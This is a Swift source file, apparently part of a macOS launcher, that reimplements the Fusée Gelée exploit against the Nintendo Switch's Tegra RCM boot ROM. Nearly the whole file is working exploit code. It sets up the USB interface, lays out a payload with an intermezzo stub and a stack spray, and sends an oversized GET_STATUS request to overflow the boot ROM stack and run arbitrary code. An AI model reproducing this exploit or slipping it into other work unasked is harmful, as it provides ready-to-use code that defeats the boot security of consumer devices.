import Cocoa
import USBDeviceSwift
import IOKit

// rewritten from fusee_gelee.py !!
let RCM_PAYLOAD_ADDR: UInt32 = 0x40010000
let PAYLOAD_START_ADDR: UInt32 = 0x40010E40
let STACK_SPRAY_START: UInt32 = 0x40014E40
let STACK_SPRAY_END: UInt32 = 0x40017000
let MAX_PAYLOAD_LENGTH: Int = 0x30298
let COPY_BUFFER_ADDRESSES = [0x40005000, 0x40009000]
let STACK_END = 0x40010000

extension Notification.Name {
    static let PayloadTypeDetected = Notification.Name("PayloadTypeDetected")
}

enum NXPayload: Int {
    case fusee = 0
    case hekate = 1
    case rei = 2
    case briccmii = 3
    case lockpick = 4
    case generic = 5
}

enum TEGRAREQUEST: UInt8 {
    case STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT = 0x82
    case STANDARD_REQUEST_DEVICE_TO_HOST = 0x80
    case GET_DESCRIPTOR = 0x6
    case GET_CONFIGURATION = 0x8
    case GET_STATUS = 0x0
}

enum VID: UInt16 {
    case RCM = 0x0955
    case NX = 0x057E
}

enum PID: UInt16 {
    case RCM = 0x7321
    case NX = 0x2000
}

enum TegraDeviceError: Error {
    case DevIoIfaceNotFound
    case IoIfaceNotFound(step: String, code: Int32)
    case InvalidData(desc: String)
    case RequestError(desc: String)
    case OversizedPayload(bytesOver: Int)
    case NoIntermezzo
    case IoReadPipeError(desc: String)
    case IoWritePipeError(desc: String)
    case CantOpenIface(code: Int32)
    case IoDevConfFail(desc: String)
    case BadId
}

class TegraDevice {
    var deviceInfo: USBDevice
    private var currentBuffer: Int = 0
    private var interface: UnsafeMutablePointer<UnsafeMutablePointer<IOUSBInterfaceInterface>?>?
    
    required init(_ deviceInfo: USBDevice) {
        self.deviceInfo = deviceInfo
    }
    
    private func inferPayloadType(payload: Data) -> NXPayload {
        let payloadBytes = [UInt8](payload)
        
        if payloadBytes.count < 5 {
            return .generic
        }
        
        let header = Array(payloadBytes.prefix(5))
        
        // constants which identify payloads so we can show a
        // nice little graphic
        let atmosphere: [UInt8] = [0xdf, 0xf0, 0x2f, 0xe3, 0x90]
        let hekateOrLockpick: [UInt8] = [0x08, 0x00, 0x4f, 0xe2, 0x70]
        let briccmii: [UInt8] = [0x00, 0x00, 0xa0, 0xe1, 0x00]
        let rei: [UInt8] = [0x08, 0x00, 0x4f, 0xe2, 0x8c]
        let switchbrewString: [UInt8] = [0x73, 0x77, 0x69, 0x74, 0x63, 0x68, 0x62, 0x72, 0x65, 0x77]
        
        switch header {
        case atmosphere:
            return .fusee;
        case rei:
            return .rei;
        case briccmii:
            return .briccmii;
        case hekateOrLockpick:
            if payloadBytes.count >= switchbrewString.count {
                for i in 0...(payloadBytes.count - switchbrewString.count) {
                    let slice = Array(payloadBytes[i..<(i + switchbrewString.count)])
                    if slice == switchbrewString {
                        return .hekate
                    }
                }
            }
            return .lockpick;
        default:
            return .generic;
        }
    }
    
    private func configureDevice() throws {
        guard let deviceInterface = self.deviceInfo.deviceInterfacePtrPtr?.pointee?.pointee else {
            throw TegraDeviceError.DevIoIfaceNotFound
        }
        
        var configDescPtr: UnsafeMutablePointer<IOUSBConfigurationDescriptor>?
        var kr = deviceInterface.GetConfigurationDescriptorPtr(self.deviceInfo.deviceInterfacePtrPtr, 0, &configDescPtr)
        
        guard kr == kIOReturnSuccess, let configDesc = configDescPtr else {
            throw TegraDeviceError.IoDevConfFail(desc: "[error] Couldn't get IOUSBConfigurationDescriptor.")
        }
        
        kr = deviceInterface.SetConfiguration(self.deviceInfo.deviceInterfacePtrPtr, configDesc.pointee.bConfigurationValue)
        
        if kr != kIOReturnSuccess && kr != kIOReturnBusy {
            throw TegraDeviceError.IoDevConfFail(desc: "[error] Couldn't set device configuration. IOKit error: \(kr)")
        }
    }
    
    // This is annoying
    private func setupInterface() throws {
        try configureDevice()
        
        guard let deviceInterface = self.deviceInfo.deviceInterfacePtrPtr?.pointee?.pointee else {
            throw TegraDeviceError.DevIoIfaceNotFound
        }
        
        var interfaceRequest = IOUSBFindInterfaceRequest(
            bInterfaceClass: UInt16(kIOUSBFindInterfaceDontCare),
            bInterfaceSubClass: UInt16(kIOUSBFindInterfaceDontCare),
            bInterfaceProtocol: UInt16(kIOUSBFindInterfaceDontCare),
            bAlternateSetting: UInt16(kIOUSBFindInterfaceDontCare)
        )
        
        var interfaceIterator: io_iterator_t = 0
        var kr = deviceInterface.CreateInterfaceIterator(self.deviceInfo.deviceInterfacePtrPtr, &interfaceRequest, &interfaceIterator)
        
        if kr != kIOReturnSuccess { throw TegraDeviceError.IoIfaceNotFound(step: "CreateInterfaceIterator", code: kr) }
        
        let usbInterface = IOIteratorNext(interfaceIterator)
        IOObjectRelease(interfaceIterator)
        
        if usbInterface == 0 { throw TegraDeviceError.IoIfaceNotFound(step: "IOIteratorNext", code: 0) }
        
        var score: Int32 = 0
        var plugInInterfacePtrPtr: UnsafeMutablePointer<UnsafeMutablePointer<IOCFPlugInInterface>?>?
        
        kr = IOCreatePlugInInterfaceForService(usbInterface, kIOUSBInterfaceUserClientTypeID, kIOCFPlugInInterfaceID, &plugInInterfacePtrPtr, &score)
        IOObjectRelease(usbInterface)
        
        if kr != kIOReturnSuccess { throw TegraDeviceError.IoIfaceNotFound(step: "IOCreatePlugInInterfaceForService", code: kr) }
        
        // throw really specific errors just to make stuff easier if it fails for someone
        guard let plugInInterface = plugInInterfacePtrPtr?.pointee?.pointee else {
            throw TegraDeviceError.IoIfaceNotFound(step: "[error] plugInInterface dereference fail", code: 0)
        }
        
        var interfacePtrPtr: UnsafeMutablePointer<UnsafeMutablePointer<IOUSBInterfaceInterface>?>?
        
        kr = withUnsafeMutablePointer(to: &interfacePtrPtr) {
            $0.withMemoryRebound(to: Optional<LPVOID>.self, capacity: 1) {
                plugInInterface.QueryInterface(plugInInterfacePtrPtr, CFUUIDGetUUIDBytes(kIOUSBInterfaceInterfaceID), $0)
            }
        }
        
        if kr != kIOReturnSuccess { throw TegraDeviceError.IoIfaceNotFound(step: "QueryInterface", code: kr) }
        
        self.interface = interfacePtrPtr
        
        guard let interfaceInterface = self.interface?.pointee?.pointee else {
            throw TegraDeviceError.IoIfaceNotFound(step: "[error] interfaceInterface dereference fail", code: 0)
        }
        
        kr = interfaceInterface.USBInterfaceOpen(self.interface)
        
        if kr != kIOReturnSuccess && kr != kIOReturnExclusiveAccess {
            throw TegraDeviceError.CantOpenIface(code: kr)
        }
    }
    
    func read(length: Int) throws -> [UInt8] {
        if self.interface == nil {
            try setupInterface()
        }
        
        guard let interfaceInterface = self.interface?.pointee?.pointee else {
            throw TegraDeviceError.IoIfaceNotFound(step: "[error] dereference fail during read()", code: 0)
        }
        
        var data = [UInt8](repeating: 0, count: length)
        var size = UInt32(length)
        
        let kr = interfaceInterface.ReadPipeTO(self.interface, 1, &data, &size, 1000, 1000)
        
        if kr != kIOReturnSuccess {
            print("[error] ReadPipeTO failed with kr=\(kr) (0x\(String(kr, radix: 16)))")
            throw TegraDeviceError.IoReadPipeError(desc: "[error] ReadPipeTO fail, error: \(kr)")
        }
        
        print("[debug] read \(size) bytes...")
        return Array(data.prefix(Int(size)))
    }
    
    private func toggleBuffer() {
        currentBuffer = 1 - currentBuffer
        print("[debug] buffer toggled to \(currentBuffer) (address: 0x\(String(getCurrentBufferAddress(), radix: 16)))")
    }
    
    private func getCurrentBufferAddress() -> Int {
        return COPY_BUFFER_ADDRESSES[currentBuffer]
    }
    
    func writeSingleBuffer(data: [UInt8]) throws {
        if self.interface == nil {
            try setupInterface()
        }
        
        guard let interfaceInterface = self.interface?.pointee?.pointee else {
            throw TegraDeviceError.IoIfaceNotFound(step: "[error] dereference fail during writeSingleBuffer", code: 0)
        }
        
        
        toggleBuffer()
        
        var mutableData = data
        let kr = interfaceInterface.WritePipeTO(self.interface, 2, &mutableData, UInt32(data.count), 1000, 1000)
        
        if kr != kIOReturnSuccess {
            print("[debug] WritePipeTO failed with kr=\(kr) (0x\(String(kr, radix: 16)))")
            throw TegraDeviceError.IoWritePipeError(desc: "[error] WritePipeTO fail, error: \(kr)")
        }
    }
    
    func write(data: [UInt8]) throws {
        var remainingData = data
        let packetSize = 0x1000
        var chunkCount = 0
        
        while !remainingData.isEmpty {
            NotificationCenter.default.post(name: .ProgressUpdate, object: ["by": 10.0])
            let dataToTransmit = min(remainingData.count, packetSize)
            let chunk = Array(remainingData.prefix(dataToTransmit))
            remainingData = Array(remainingData.dropFirst(dataToTransmit))
            
            try writeSingleBuffer(data: chunk)
            chunkCount += 1
        }
        
        print("[debug] Wrote \(chunkCount) chunks")
    }
    
    func switchToHighBuffer() throws {
        print("[debug] Current buffer before switch: \(currentBuffer) at 0x\(String(getCurrentBufferAddress(), radix: 16))")
        if getCurrentBufferAddress() != COPY_BUFFER_ADDRESSES[1] {
            print("[debug] Switching to high buffer by writing padding")
            let padding = [UInt8](repeating: 0, count: 0x1000)
            try write(data: padding)
        } else {
            print("[debug] Already on high buffer")
        }
    }
    
    func readDeviceId() throws -> [UInt8] {
        let deviceId = try read(length: 16)
        
        
        if deviceId.allSatisfy({ $0 == 0 }) {
            throw TegraDeviceError.BadId
        }
        
        return deviceId
    }
    
    func triggerVulnerability() throws {
        guard let deviceInterface = self.deviceInfo.deviceInterfacePtrPtr?.pointee?.pointee else {
            throw TegraDeviceError.DevIoIfaceNotFound
        }
        
        
        let length = STACK_END - getCurrentBufferAddress()
        print("[debug] Triggering vulnerability with length=0x\(String(length, radix: 16)) (STACK_END=0x\(String(STACK_END, radix: 16)) - current_buffer=0x\(String(getCurrentBufferAddress(), radix: 16)))")
        
        var responseData = [UInt8](repeating: 0, count: length)
        
        var request = IOUSBDevRequestTO(
            bmRequestType: TEGRAREQUEST.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT.rawValue,
            bRequest: TEGRAREQUEST.GET_STATUS.rawValue,
            wValue: 0,
            wIndex: 0,
            wLength: UInt16(length),
            pData: &responseData,
            wLenDone: 0,
            noDataTimeout: 1000,
            completionTimeout: 1000
        )
        
        let kr = deviceInterface.DeviceRequestTO(self.deviceInfo.deviceInterfacePtrPtr, &request)
        
        print("[debug] DeviceRequestTO returned kr=\(kr) (0x\(String(kr, radix: 16)))")
        
        if kr != kIOReturnSuccess {
            
            return
        }
        
        throw TegraDeviceError.RequestError(desc: "[error] Vulnerability trigger unexpectedly succeeded, the exploit likely failed.")
    }
    
    func pushPayload(payloadData: Data, intermezzoPath: String) throws {
        print("[debug] Starting payload push process...")
        print("[debug] Payload size: \(payloadData.count) bytes")
        
        let payloadType = inferPayloadType(payload: payloadData)
        NotificationCenter.default.post(name: .PayloadTypeDetected, object: payloadType.rawValue)
        
        
        guard let intermezzoData = try? Data(contentsOf: URL(fileURLWithPath: intermezzoPath)) else {
            print("Could not find intermezzo.bin at: \(intermezzoPath)")
            throw TegraDeviceError.NoIntermezzo // in case they delete it from the app's contents for some weird reason
        }
        
        print("[debug] Loaded intermezzo.bin (\(intermezzoData.count) bytes)")
        
        let deviceId = try readDeviceId()
        print("[debug] Found a Tegra with Device ID: \(deviceId.map { String(format: "%02x", $0) }.joined())")
        
        print("[debug] Setting ourselves up to smash the stack...")
        
        
        var payload = [UInt8]()
        
        
        let length = MAX_PAYLOAD_LENGTH
        payload += withUnsafeBytes(of: UInt32(length).littleEndian) { Array($0) }
        
        
        let paddingTo680 = 680 - payload.count
        payload += [UInt8](repeating: 0, count: paddingTo680)
        
        
        let intermezzoSize = intermezzoData.count
        payload += [UInt8](intermezzoData)
        
        
        
        let currentOffset = RCM_PAYLOAD_ADDR + UInt32(intermezzoSize)
        let paddingToPayloadStart = Int(PAYLOAD_START_ADDR - currentOffset)
        payload += [UInt8](repeating: 0, count: paddingToPayloadStart)
        
        
        let payloadBytes = [UInt8](payloadData)
        let firstChunkSize = Int(STACK_SPRAY_START - PAYLOAD_START_ADDR)
        payload += payloadBytes.prefix(firstChunkSize)
        
        
        let repeatCount = Int(STACK_SPRAY_END - STACK_SPRAY_START) / 4
        let sprayValue = withUnsafeBytes(of: RCM_PAYLOAD_ADDR.littleEndian) { Array($0) }
        for _ in 0..<repeatCount {
            payload += sprayValue
        }
        
        
        let remainderSize = payloadBytes.count - firstChunkSize
        payload += payloadBytes.dropFirst(firstChunkSize)
        
        
        let payloadLength = payload.count
        let paddingToAlign = 0x1000 - (payloadLength % 0x1000)
        payload += [UInt8](repeating: 0, count: paddingToAlign)
        
        
        if payload.count > length {
            let sizeOver = payload.count - length
            print("[error] Payload is too large to be submitted via RCM. (\(sizeOver) bytes larger than max).")
            throw TegraDeviceError.OversizedPayload(bytesOver: sizeOver)
        }
        
        print("Uploading payload...")
        print("[debug] Starting write of \(payload.count) bytes in 0x1000 byte chunks")
        try write(data: payload)
        
        print("[debug] Switching to high buffer...")
        try switchToHighBuffer()
        
        print("[debug] Smashing the stack...")
        do {
            try triggerVulnerability()
        } catch {
            print("[debug] triggerVulnerability threw: \(error)")
        }
        // yay
        print("The USB device stopped responding-- sure smells like we've smashed its stack. :)")
        print("Launch complete!")
    }
    
    deinit {
        if let interfaceInterface = self.interface?.pointee?.pointee {
            interfaceInterface.USBInterfaceClose(self.interface)
            interfaceInterface.Release(self.interface)
        }
    }
}
